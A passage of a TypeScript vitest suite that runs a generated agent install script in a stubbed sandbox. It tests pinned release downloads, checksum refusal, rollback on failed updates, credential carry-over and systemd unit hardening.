/**
 * Exercises the generated install script end to end in a sandbox.
 *
 * `HOME` points at a temporary directory and `PATH` starts with stubs for
 * `curl`, `npm`, and the service manager, so a test never reaches the network,
 * never installs a launchd or systemd service, and never touches the real
 * `~/.runner-center`.
 *
 * @vitest-environment node
 *
 * The suite spawns bash and reads the filesystem, so it needs the real Node
 * runtime rather than the edge-runtime default the convex-test suites use.
 */
import { afterAll, describe, expect, it } from "vitest";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  renameSync,
  rmSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { homedir, tmpdir } from "node:os";
import path from "node:path";
import {
  AGENT_RELEASE,
  CONTROLLER_TARGETS,
  controllerAssetName,
  INFRA_AGENT_TARGETS,
  infraAgentAssetName,
  type AgentRelease,
} from "../convex/agentRelease.ts";
import { resolveSiteUrl } from "../convex/githubAppConfig.ts";
import { renderInstallScript } from "../convex/installScript.ts";
import {
  FIRECRACKER_HOST_PROVISIONER_B64,
  FIRECRACKER_HOST_PROVISIONER_SHA256,
  FIRECRACKER_RUNTIME_UNIT_B64,
  FIRECRACKER_RUNTIME_UNIT_SHA256,
} from "../convex/provisionerFirecrackerHost.generated.ts";
import { CONTROLLER_UNIT_B64, CONTROLLER_UNIT_SHA256 } from "../convex/controllerUnit.generated.ts";

const SITE_URL = "https://example.convex.site";
const TEST_REPO = "runner-center-tests/runner-center";
const MACHINE_TOKEN = "a".repeat(32);
const SERVICE_KIND = process.platform === "darwin" ? "launchd" : "systemd";

const sandboxes: string[] = [];

afterAll(() => {
  for (const directory of sandboxes) {
    rmSync(directory, { recursive: true, force: true });
  }
});

function writeExecutable(filePath: string, contents: string) {
  writeFileSync(filePath, contents);
  chmodSync(filePath, 0o755);
}

function siteUrlAssignments(script: string) {
  return [...script.matchAll(/^SITE_URL='([^']*)'$/gm)].map((match) => match[1]);
}

/** A stub that answers only the URLs a test registers, and logs every request. */
const CURL_STUB = `#!/usr/bin/env bash
out=""
want_status=0
url=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    -o) out=$2; shift 2 ;;
    -w) want_status=1; shift 2 ;;
    -H|--data|--max-time) shift 2 ;;
    -*) shift ;;
    *) url=$1; shift ;;
  esac
done
printf '%s\\n' "$url" >> "$RC_TEST_CURL_LOG"
entry=$(awk -F '|' -v u="$url" '$1 == u { print $2 "|" $3; exit }' "$RC_TEST_ROUTES")
if [ -z "$entry" ]; then
  if [ "$want_status" -eq 1 ]; then printf '404'; fi
  exit 22
fi
status=$(printf '%s' "$entry" | cut -d '|' -f 1)
body=$(printf '%s' "$entry" | cut -d '|' -f 2)
if [ -n "$out" ]; then cp "$body" "$out"; else cat "$body"; fi
if [ "$want_status" -eq 1 ]; then printf '%s' "$status"; fi
exit 0
`;

const NPM_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_NPM_LOG"
if [ "$RC_TEST_NPM_FAIL" = "1" ]; then
  printf 'npm stub failure\\n' >&2
  exit 1
fi
if [ "$1" = "ci" ]; then
  mkdir -p node_modules
  printf 'installed\\n' > node_modules/.installed
fi
exit 0
`;

/** Both service managers "start" the agent by publishing its versioned readiness file. */
const SERVICE_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SERVICE_LOG"
for arg in "$@"; do
  case "$arg" in
    kickstart|restart)
      if [ "$RC_TEST_CONNECT" = "1" ]; then
        version=$(node -p "require(process.env.HOME + '/.runner-center/agent/package.json').version")
        printf '%s\\n' "$version" > "$HOME/.runner-center/agent.ready"
      fi
      ;;
  esac
done
exit 0
`;

/**
 * An unprivileged box. Every privileged step the Node installer attempts is refused, which keeps a
 * test from writing /etc/portless or a systemd unit on the machine running the suite, and exercises
 * the fallback the installer takes on a box where the operator is not root.
 */
const SUDO_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SUDO_LOG"
exit 1
`;

/**
 * A box where the operator *can* become root, with every privileged path redirected under
 * RC_TEST_SUDO_ROOT. Reaching the systemd branch is the only way to test it, and the redirection is
 * what keeps "reach it" from meaning "write /etc/systemd on the machine running the suite".
 */
const ROOT_SUDO_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SUDO_LOG"
count=$#
while [ "$count" -gt 0 ]; do
  arg=$1
  shift
  case "$arg" in
    /etc/*|/run/systemd*|/usr/local/*) set -- "$@" "$RC_TEST_SUDO_ROOT$arg" ;;
    *) set -- "$@" "$arg" ;;
  esac
  count=$((count - 1))
done
exec "$@"
`;

type Sandbox = {
  root: string;
  home: string;
  rcHome: string;
  scriptPath: string;
  routesPath: string;
  curlLog: string;
  npmLog: string;
  fixtures: string;
  sudoRoot: string;
};

function createSandbox(release: AgentRelease): Sandbox {
  const root = mkdtempSync(path.join(tmpdir(), "rc-install-"));
  sandboxes.push(root);
  const home = path.join(root, "home");
  const binDir = path.join(root, "bin");
  const fixtures = path.join(root, "fixtures");
  for (const directory of [home, binDir, fixtures]) {
    mkdirSync(directory, { recursive: true });
  }
  expect(home, "the sandbox must not be the real home directory").not.toBe(homedir());

  writeExecutable(
    path.join(binDir, "node"),
    `#!/usr/bin/env bash\nexec ${process.execPath} "$@"\n`,
  );
  writeExecutable(path.join(binDir, "npm"), NPM_STUB);
  writeExecutable(path.join(binDir, "curl"), CURL_STUB);
  writeExecutable(path.join(binDir, "launchctl"), SERVICE_STUB);
  writeExecutable(path.join(binDir, "systemctl"), SERVICE_STUB);
  writeExecutable(path.join(binDir, "sudo"), SUDO_STUB);

  const scriptPath = path.join(root, "install.sh");
  writeFileSync(scriptPath, renderInstallScript(SITE_URL, release));

  const routesPath = path.join(root, "routes");
  writeFileSync(routesPath, "");

  return {
    root,
    home,
    rcHome: path.join(home, ".runner-center"),
    scriptPath,
    routesPath,
    curlLog: path.join(root, "curl.log"),
    npmLog: path.join(root, "npm.log"),
    fixtures,
    sudoRoot: path.join(root, "root"),
  };
}

/**
 * Let this sandbox's installer succeed at being root. /etc/systemd/system is created because every
 * box that has systemd already has it — the installer creates /etc/portless and nothing else.
 */
function grantRoot(sandbox: Sandbox) {
  writeExecutable(path.join(sandbox.root, "bin", "sudo"), ROOT_SUDO_STUB);
  mkdirSync(path.join(sandbox.sudoRoot, "run", "systemd", "system"), { recursive: true });
  mkdirSync(path.join(sandbox.sudoRoot, "etc", "systemd", "system"), { recursive: true });
}

/** Re-render the script, e.g. once a published archive's checksum is known. */
function repin(sandbox: Sandbox, release: AgentRelease) {
  writeFileSync(sandbox.scriptPath, renderInstallScript(SITE_URL, release));
}

function route(sandbox: Sandbox, url: string, filePath: string, status = 200) {
  const existing = readFileSync(sandbox.routesPath, "utf8");
  writeFileSync(sandbox.routesPath, `${existing}${url}|${status}|${filePath}\n`);
}

/** Build a release archive shaped like the real one, plus its checksum sidecar. */
function publishRelease(
  sandbox: Sandbox,
  release: AgentRelease,
  marker: string,
  assetPrefix: "erainfra-agent" | "runner-center-agent" = "erainfra-agent",
) {
  const stage = path.join(sandbox.fixtures, `stage-${release.version}`, "agent");
  mkdirSync(path.join(stage, "dist"), { recursive: true });
  mkdirSync(path.join(stage, "provisioners"), { recursive: true });
  writeFileSync(path.join(stage, "dist", "index.js"), `// ${marker}\n`);
  writeFileSync(path.join(stage, "package.json"), `{"version":"${release.version}"}\n`);
  writeFileSync(path.join(stage, "package-lock.json"), '{"lockfileVersion":3}\n');
  writeFileSync(path.join(stage, "provisioners", "provision-linux.sh"), "#!/usr/bin/env bash\n");
  for (const architecture of ["x86_64", "arm64"]) {
    const runtime = path.join(stage, "runtime", `linux-${architecture}`, "runner-center-runtime");
    mkdirSync(path.dirname(runtime), { recursive: true });
    writeExecutable(runtime, "#!/usr/bin/env bash\nexit 0\n");
  }

  const assetName = `${assetPrefix}-${release.version}.tar.gz`;
  const archivePath = path.join(sandbox.fixtures, assetName);
  const tar = spawnSync("tar", ["-czf", archivePath, "-C", path.dirname(stage), "agent"]);
  expect(tar.status, tar.stderr?.toString()).toBe(0);

  const sha256 = createHash("sha256").update(readFileSync(archivePath)).digest("hex");
  const checksumPath = `${archivePath}.sha256`;
  writeFileSync(checksumPath, `${sha256}  ${assetName}\n`);

  const base = `https://github.com/${release.repo}/releases/download/v${release.version}`;
  route(sandbox, `${base}/${assetName}`, archivePath);
  route(sandbox, `${base}/${assetName}.sha256`, checksumPath);
  return { sha256, checksumPath, archivePath };
}

function publishRegistration(sandbox: Sandbox) {
  const responsePath = path.join(sandbox.fixtures, "register.json");
  writeFileSync(
    responsePath,
    JSON.stringify({ machineToken: MACHINE_TOKEN, convexUrl: "https://example.convex.cloud" }),
  );
  route(sandbox, `${SITE_URL}/agents/register`, responsePath);
}

/** Pretend an older agent is already installed and running on this machine. */
function seedExistingInstall(sandbox: Sandbox, version: string, marker: string) {
  const agentDir = path.join(sandbox.rcHome, "agent");
  mkdirSync(path.join(agentDir, "dist"), { recursive: true });
  writeFileSync(path.join(agentDir, "dist", "index.js"), `// ${marker}\n`);
  writeFileSync(path.join(agentDir, "package.json"), `{"version":"${version}"}\n`);
  writeFileSync(
    path.join(agentDir, ".env"),
    `CONVEX_URL=https://example.convex.cloud\nMACHINE_TOKEN=${MACHINE_TOKEN}\n`,
  );
  writeFileSync(
    path.join(sandbox.rcHome, "install-meta"),
    [
      `SITE_URL=${SITE_URL}`,
      "NODE_BIN=/does/not/matter/node",
      "MACHINE_NAME=seeded-machine",
      `SERVICE_KIND=${SERVICE_KIND}`,
      `AGENT_VERSION=${version}`,
      "",
    ].join("\n"),
  );
  writeFileSync(path.join(sandbox.rcHome, "agent.log"), "");
}

function run(
  sandbox: Sandbox,
  args: readonly string[],
  options: { connect?: boolean; npmFails?: boolean } = {},
) {
  return spawnSync("bash", [sandbox.scriptPath, ...args], spawnOptions(sandbox, options));
}

function spawnOptions(sandbox: Sandbox, options: { connect?: boolean; npmFails?: boolean } = {}) {
  return {
    encoding: "utf8" as const,
    env: {
      PATH: `${path.join(sandbox.root, "bin")}:/usr/bin:/bin:/usr/sbin:/sbin`,
      HOME: sandbox.home,
      RC_TEST_ROUTES: sandbox.routesPath,
      RC_TEST_CURL_LOG: sandbox.curlLog,
      RC_TEST_NPM_LOG: sandbox.npmLog,
      RC_TEST_SERVICE_LOG: path.join(sandbox.root, "service.log"),
      RC_TEST_NPM_FAIL: options.npmFails === true ? "1" : "0",
      RC_TEST_CONNECT: options.connect === false ? "0" : "1",
      RC_TEST_SUDO_LOG: path.join(sandbox.root, "sudo.log"),
      RC_TEST_SUDO_ROOT: sandbox.sudoRoot,
      RC_TEST_AGENT_LOG: path.join(sandbox.root, "infra-agent.log"),
    },
  };
}

function readLog(filePath: string) {
  return existsSync(filePath) ? readFileSync(filePath, "utf8") : "";
}

/**
 * Reads a log written by a process the installer started in the background. The installer returns
 * as soon as it has launched `nohup … &`, so the child may not have written its first line yet; on
 * a loaded machine that gap is long enough for a single read to see an empty file. Polls until
 * `expected` matches or the deadline passes, then returns whatever is there, so the caller's
 * assertion still reports the real content when the line never arrives.
 */
async function waitForLog(filePath: string, expected: RegExp, timeoutMs = 15_000) {
  const deadline = Date.now() + timeoutMs;
  let contents = readLog(filePath);
  while (!expected.test(contents) && Date.now() < deadline) {
    await new Promise((resolve) => setTimeout(resolve, 50));
    contents = readLog(filePath);
  }
  return contents;
}

function agentMarker(sandbox: Sandbox, directory = "agent") {
  return readFileSync(path.join(sandbox.rcHome, directory, "dist", "index.js"), "utf8").trim();
}

function metaField(sandbox: Sandbox, key: string) {
  const meta = readFileSync(path.join(sandbox.rcHome, "install-meta"), "utf8");
  return meta
    .split("\n")
    .find((line) => line.startsWith(`${key}=`))
    ?.slice(key.length + 1);
}

const CURRENT: AgentRelease = {
  repo: TEST_REPO,
  version: "1.4.2",
  sha256: "",
  infraAgent: {},
  mesh: {},
  cacheService: {},
  controller: {},
};
const OLDER: AgentRelease = {
  repo: TEST_REPO,
  version: "1.3.0",
  sha256: "",
  infraAgent: {},
  mesh: {},
  cacheService: {},
  controller: {},
};

describe("install", () => {
  it("installs the immutable release asset this deployment pins", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "new agent");
    repin(sandbox, { ...CURRENT, sha256: published.sha256 });
    publishRegistration(sandbox);

    const result = run(sandbox, ["--token", "rcreg_test", "--name", "test-machine"]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);

    const requested = readLog(sandbox.curlLog);
    expect(requested).toMatch(
      /https:\/\/github\.com\/runner-center-tests\/runner-center\/releases\/download\/v1\.4\.2\/erainfra-agent-1\.4\.2\.tar\.gz$/m,
    );
    expect(requested).not.toMatch(/archive\/refs\/heads/);
    expect(agentMarker(sandbox)).toBe("// new agent");
    expect(metaField(sandbox, "AGENT_VERSION")).toBe("1.4.2");
    expect(readFileSync(path.join(sandbox.rcHome, "agent.ready"), "utf8")).toBe("1.4.2\n");
    expect(readFileSync(path.join(sandbox.rcHome, "agent", ".env"), "utf8")).toMatch(
      new RegExp(`MACHINE_TOKEN=${MACHINE_TOKEN}`),
    );
    for (const architecture of ["x86_64", "arm64"]) {
      const runtime = path.join(
        sandbox.rcHome,
        "agent",
        "runtime",
        `linux-${architecture}`,
        "runner-center-runtime",
      );
      expect(existsSync(runtime)).toBeTruthy();
      expect(statSync(runtime).mode & 0o111).not.toBe(0);
    }
  });

  it("falls back to the permanent legacy asset name for pre-rename releases", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "legacy-named agent", "runner-center-agent");
    publishRegistration(sandbox);

    const result = run(sandbox, ["--token", "rcreg_test", "--name", "test-machine"]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);

    const requested = readLog(sandbox.curlLog);
    expect(requested).toMatch(
      /releases\/download\/v1\.4\.2\/erainfra-agent-1\.4\.2\.tar\.gz\n.*releases\/download\/v1\.4\.2\/runner-center-agent-1\.4\.2\.tar\.gz$/m,
    );
    expect(requested).toMatch(
      /releases\/download\/v1\.4\.2\/runner-center-agent-1\.4\.2\.tar\.gz\.sha256$/m,
    );
    expect(requested).not.toMatch(/erainfra-agent-1\.4\.2\.tar\.gz\.sha256/);
    expect(agentMarker(sandbox)).toBe("// legacy-named agent");
  });

  it("installs dependencies from the release lockfile with npm ci", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    publishRegistration(sandbox);

    expect(run(sandbox, ["--token", "rcreg_test"]).status).toBe(0);
    expect(readLog(sandbox.npmLog)).toMatch(/^ci --omit=dev --no-audit --no-fund$/m);
    expect(
      existsSync(path.join(sandbox.rcHome, "agent", "node_modules", ".installed")),
    ).toBeTruthy();
  });
});

// These cases execute complete install/update shell sandboxes, just like the controller-role
// suite below. Give them the same budget: subprocess scheduling on a loaded two-core runner can
// exceed the 30-second unit-test default even when every assertion succeeds.
describe("update", { timeout: 120_000 }, () => {
  it("can replace the legacy CLI without corrupting its running shell", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "0.1.0", "legacy agent");
    route(sandbox, `${SITE_URL}/install`, sandbox.scriptPath);

    const legacyCli = path.join(import.meta.dirname, "fixtures", "legacy-rc-v0.sh");
    const rcPath = path.join(sandbox.rcHome, "bin", "rc");
    mkdirSync(path.dirname(rcPath), { recursive: true });
    writeExecutable(rcPath, readFileSync(legacyCli, "utf8"));

    const result = spawnSync("bash", [rcPath, "update"], spawnOptions(sandbox));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(result.stderr).not.toMatch(/syntax error|unexpected EOF/);
    expect(agentMarker(sandbox)).toBe("// new agent");
    expect(existsSync(rcPath)).toBeTruthy();
    expect(statSync(rcPath).mode & 0o111).not.toBe(0);
  });

  it("installs an older version when the operator supplies its independent checksum", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    const older = publishRelease(sandbox, OLDER, "older agent");
    seedExistingInstall(sandbox, "1.4.2", "current agent");

    const result = run(sandbox, ["--update", "--version", "v1.3.0", "--sha256", older.sha256]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);

    const requested = readLog(sandbox.curlLog);
    expect(requested).toMatch(/releases\/download\/v1\.3\.0\/erainfra-agent-1\.3\.0\.tar\.gz$/m);
    expect(requested).not.toMatch(/erainfra-agent-1\.4\.2/);
    expect(agentMarker(sandbox)).toBe("// older agent");
    expect(metaField(sandbox, "AGENT_VERSION")).toBe("1.3.0");
  });

  it("refuses a historical release without an independently supplied checksum", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, OLDER, "older agent");
    seedExistingInstall(sandbox, "1.4.2", "current agent");

    const result = run(sandbox, ["--update", "--version", "v1.3.0"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/other than the deployment pin requires --sha256/);
    expect(readLog(sandbox.curlLog)).toBe("");
    expect(agentMarker(sandbox)).toBe("// current agent");
  });

  it("keeps the replaced installation so a bad release can be recovered", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    expect(run(sandbox, ["--update"]).status).toBe(0);
    expect(agentMarker(sandbox)).toBe("// new agent");
    expect(agentMarker(sandbox, "agent.previous")).toBe("// older agent");
  });

  it("carries the machine credentials across the replacement", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    expect(run(sandbox, ["--update"]).status).toBe(0);
    expect(readFileSync(path.join(sandbox.rcHome, "agent", ".env"), "utf8")).toMatch(
      new RegExp(`MACHINE_TOKEN=${MACHINE_TOKEN}`),
    );
  });

  it("refuses an update when no machine is registered yet", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");

    const result = run(sandbox, ["--update"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/No existing EraInfra registration/);
  });

  it("rejects a version that is not a release version", () => {
    const sandbox = createSandbox(CURRENT);
    const result = run(sandbox, ["--update", "--version", "main"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/--version must be a release version/);
  });
});

describe("checksum verification", () => {
  it("stops before touching the running agent when the archive does not match", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "tampered agent");
    writeFileSync(published.checksumPath, `${"0".repeat(64)}  erainfra-agent-1.4.2.tar.gz\n`);
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    const result = run(sandbox, ["--update"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/checksum verification failed/);
    expect(agentMarker(sandbox)).toBe("// older agent");
    expect(!existsSync(path.join(sandbox.rcHome, "agent.previous"))).toBeTruthy();
    expect(readLog(sandbox.npmLog)).toBe("");
  });

  it("rejects an archive that the release vouches for but this deployment does not", () => {
    const sandbox = createSandbox({ ...CURRENT, sha256: "b".repeat(64) });
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    const result = run(sandbox, ["--update"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/pinned by this EraInfra deployment/);
    expect(agentMarker(sandbox)).toBe("// older agent");
  });

  it("accepts an archive that matches the checksum passed on the command line", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");
    rmSync(published.checksumPath);

    const result = run(sandbox, ["--update", "--sha256", published.sha256]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(agentMarker(sandbox)).toBe("// new agent");
  });
});

describe("rollback", { timeout: 120_000 }, () => {
  // This one waits out the installer's own connect timeout before rolling
  // back, so it needs more than vitest's 5s default. The wait is the
  // behaviour under test: the script must not declare success early.
  it("restores the previous agent when the new one never connects", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");
    // A previous process or version must never satisfy this rollout's probe.
    writeFileSync(path.join(sandbox.rcHome, "agent.ready"), `${CURRENT.version}\n`);

    const result = run(sandbox, ["--update"], { connect: false });
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/rolled back to the previous installation/);
    expect(agentMarker(sandbox)).toBe("// older agent");
    expect(!existsSync(path.join(sandbox.rcHome, "agent.previous"))).toBeTruthy();
    expect(metaField(sandbox, "AGENT_VERSION")).toBe("1.3.0");
  }, 60_000);

  it("leaves the running agent in place when dependency installation fails", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    const result = run(sandbox, ["--update"], { npmFails: true });

    expect(result.status).not.toBe(0);
    expect(agentMarker(sandbox)).toBe("// older agent");
    expect(!existsSync(path.join(sandbox.rcHome, "agent.previous"))).toBeTruthy();
  });
});

describe("rendered script", () => {
  const script = renderInstallScript(SITE_URL, AGENT_RELEASE);

  it("is valid bash", () => {
    const check = spawnSync("bash", ["-n"], { input: script, encoding: "utf8" });
    expect(check.status, check.stderr).toBe(0);
  });

  // A systemd host cannot run in this sandbox, so the --mesh service is checked as rendered text:
  // the sidecar runs as its own user with a private key directory, and the agent can only reach
  // it through the group-owned runtime directory.
  it("runs the mesh sidecar as its own unprivileged user with private state", () => {
    const unit = script.slice(
      script.indexOf("[Unit]\nDescription=EraInfra authenticated Node mesh"),
    );
    expect(unit).toMatch(/^User=erainfra-mesh$/m);
    expect(unit).toMatch(/^Group=erainfra-mesh$/m);
    expect(unit).toMatch(/^UMask=0077$/m);
    expect(unit).toMatch(/^StateDirectoryMode=0700$/m);
    expect(unit).toMatch(/^RuntimeDirectoryMode=0750$/m);
    expect(unit).toMatch(/^NoNewPrivileges=yes$/m);
    expect(unit).toMatch(/^CapabilityBoundingSet=$/m);
    expect(unit).toMatch(/^MemoryMax=/m);
    expect(unit).toMatch(/--key \/var\/lib\/erainfra-mesh\/endpoint\.key/);
    expect(script).toMatch(
      /install -d -m 700 -o erainfra-mesh -g erainfra-mesh \/var\/lib\/erainfra-mesh/,
    );
    expect(script).toMatch(/SupplementaryGroups=erainfra-mesh/);
    expect(script).not.toMatch(/dumbpipe-\$|n0-computer\/dumbpipe/);
  });

  it("never downloads a mutable branch tarball", () => {
    expect(script).not.toMatch(/archive\/refs\/heads/);
    expect(script).toMatch(/releases\/download\/v\$VERSION/);
  });

  it("writes systemd agent output to the connection log", () => {
    expect(script).toMatch(/StandardOutput=append:\$LOG_FILE/);
    expect(script).toMatch(/StandardError=append:\$LOG_FILE/);
  });

  it("waits for a fresh readiness signal from the exact installed version", () => {
    expect(script).toMatch(/rm -f "\$RC_HOME\/agent\.ready"/);
    expect(script).toMatch(/cat "\$RC_HOME\/agent\.ready"/);
    expect(script).toMatch(/= "\$VERSION"/);
    expect(script).not.toMatch(/grep -Fq 'EraInfra agent connected'/);
  });

  it("tells the operator where background Profile warm-up is progressing", () => {
    expect(script).toMatch(/Profiles are prewarming in the background/);
    expect(script).toMatch(/rc logs -f/);
    expect(script).toMatch(/dashboard readiness detail/);
  });

  it("installs the on-demand benchmark against the Worker runtime volume", () => {
    expect(script).toMatch(/rc status \| doctor \| benchmark/);
    expect(script).toMatch(/RC_BENCHMARK_DIR="\$RC_HOME\/benchmarks"/);
    expect(script).toMatch(/dist\/benchmark-cli\.js/);
  });

  it("does not let an early launchd match fail status under pipefail", () => {
    expect(script).toMatch(
      /launchctl print "gui\/\$UID\/center\.runner\.agent" 2>\/dev\/null \| grep 'state = running' >\/dev\/null/,
    );
    expect(script).not.toMatch(/launchctl print[^\n]+grep -q 'state = running'/);
  });

  it("accepts either trusted Docker or isolated Firecracker on Linux", () => {
    expect(script).toMatch(/docker info/);
    expect(script).toMatch(/trusted-only Linux Profiles/);
    expect(script).toMatch(/"\$runtime" preflight/);
    expect(script).toMatch(/if \[ "\$usable" -eq 0 \]; then exit 1; fi/);
  });

  it("carries the release this deployment pins", () => {
    expect(AGENT_RELEASE.version).toMatch(/^\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)*$/);
    expect(AGENT_RELEASE.repo).toBe("Fanzzzd/erainfra");
    expect(
      AGENT_RELEASE.sha256 === "" || /^[0-9a-f]{64}$/.test(AGENT_RELEASE.sha256),
      "sha256 must be empty or a 64-character lowercase digest",
    ).toBeTruthy();
    expect(script).toMatch(new RegExp(`PINNED_VERSION='${AGENT_RELEASE.version}'`));
  });

  // A partially pinned Infra Agent is the dangerous shape: four verified targets and one that
  // installs whatever it downloads. Either every target this deployment could resolve is pinned,
  // or none is and the Node path refuses.
  it("pins every Infra Agent target, or none of them", () => {
    const pinned = Object.keys(AGENT_RELEASE.infraAgent);
    expect(
      pinned.length === 0 || pinned.length === INFRA_AGENT_TARGETS.length,
      `infraAgent covers ${pinned.length} of ${INFRA_AGENT_TARGETS.length} targets`,
    ).toBeTruthy();
    for (const target of pinned) {
      expect(INFRA_AGENT_TARGETS).toContain(target);
      expect(AGENT_RELEASE.infraAgent[target]).toMatch(/^[0-9a-f]{64}$/);
    }
  });

  // The same shape for the controller: an x86 controller host verified and an ARM one not would be
  // worse than refusing both.
  it("pins every controller target, or none of them", () => {
    const pinned = Object.keys(AGENT_RELEASE.controller);
    expect(
      pinned.length === 0 || pinned.length === CONTROLLER_TARGETS.length,
      `controller covers ${pinned.length} of ${CONTROLLER_TARGETS.length} targets`,
    ).toBeTruthy();
    for (const target of pinned) {
      expect(CONTROLLER_TARGETS).toContain(target);
      expect(AGENT_RELEASE.controller[target]).toMatch(/^[0-9a-f]{64}$/);
    }
  });
});

function nodeArgs(extra: readonly string[] = []) {
  return [
    "--role",
    "node",
    "--token",
    "plt_node_token",
    "--hub",
    "wss://hub.example.com/agent",
    "--name",
    "node-01",
    // The runtime install shells out to the distro package manager, which a test has no business
    // doing; the flag it is skipped with is the same one an operator uses.
    "--no-docker",
    ...extra,
  ];
}

/** Where a Node's agent lands — the prefix and binary name a running Node already holds. */
function installedAgent(sandbox: Sandbox) {
  return path.join(sandbox.home, ".portless", "bin", "portless-agent");
}

// The Node half of ADR 0006. A Node's binary used to arrive with no integrity check of any kind, so
// the tests that matter most here are the ones where verification says no: a path whose failure
// branch is untested is a path nobody has seen work.
describe("--role node", () => {
  const HOST_TARGET = `${process.platform === "darwin" ? "darwin" : "linux"}-${
    process.arch === "arm64" ? "arm64" : "x86_64"
  }`;

  /** A stand-in for the Infra Agent: runnable, so the installer can actually start it. */
  const FAKE_AGENT = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_AGENT_LOG"
sleep 5
`;

  function publishInfraAgent(sandbox: Sandbox, release: AgentRelease, body = FAKE_AGENT) {
    const asset = `infra-agent-${HOST_TARGET}`;
    const binaryPath = path.join(sandbox.fixtures, asset);
    writeFileSync(binaryPath, body);
    const sha256 = createHash("sha256").update(readFileSync(binaryPath)).digest("hex");
    route(
      sandbox,
      `https://github.com/${release.repo}/releases/download/v${release.version}/${asset}`,
      binaryPath,
    );
    return { sha256, binaryPath, asset };
  }

  function pinned(release: AgentRelease, digest: string): AgentRelease {
    return { ...release, infraAgent: { [HOST_TARGET]: digest } };
  }

  it("installs the binary this deployment pins, and says what it verified it against", async () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));

    const result = run(sandbox, nodeArgs());
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(result.stdout).toMatch(
      new RegExp(
        `Verified infra-agent-${HOST_TARGET} against the checksum pinned by this EraInfra deployment`,
      ),
    );

    expect(existsSync(installedAgent(sandbox))).toBeTruthy();
    expect(readFileSync(installedAgent(sandbox), "utf8")).toBe(FAKE_AGENT);
    expect(statSync(installedAgent(sandbox)).mode & 0o111).not.toBe(0);
    expect(readLog(sandbox.curlLog)).toMatch(
      new RegExp(`releases/download/v1\\.4\\.2/infra-agent-${HOST_TARGET}$`, "m"),
    );
    // It runs, with the name it was given, under the frozen binary name — and the Hub credential
    // is not on that command line. /proc/<pid>/cmdline is world-readable, so a token in argv is a
    // token every local user can read for as long as the agent runs; the agent takes it from
    // PORTLESS_TOKEN instead, the same channel the systemd unit uses.
    const argv = await waitForLog(
      path.join(sandbox.root, "infra-agent.log"),
      /^connect --name node-01$/m,
    );
    expect(argv).toMatch(/^connect --name node-01$/m);
    expect(argv).not.toMatch(/plt_node_token/);
  });

  it("refuses bytes that do not match the pin, and installs nothing", () => {
    const sandbox = createSandbox(CURRENT);
    publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, "0".repeat(64)));

    const result = run(sandbox, nodeArgs());
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/checksum verification failed/);
    expect(result.stderr).toMatch(/Nothing was installed/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
    expect(existsSync(path.join(sandbox.home, ".portless", "run", "agent.pid"))).toBe(false);
  });

  it("leaves an already-installed agent running when the new bytes do not match", () => {
    const sandbox = createSandbox(CURRENT);
    publishInfraAgent(sandbox, CURRENT, "#!/usr/bin/env bash\nsleep 5\n");
    repin(sandbox, pinned(CURRENT, "f".repeat(64)));
    mkdirSync(path.dirname(installedAgent(sandbox)), { recursive: true });
    writeExecutable(
      installedAgent(sandbox),
      "#!/usr/bin/env bash\n# the agent already installed\n",
    );

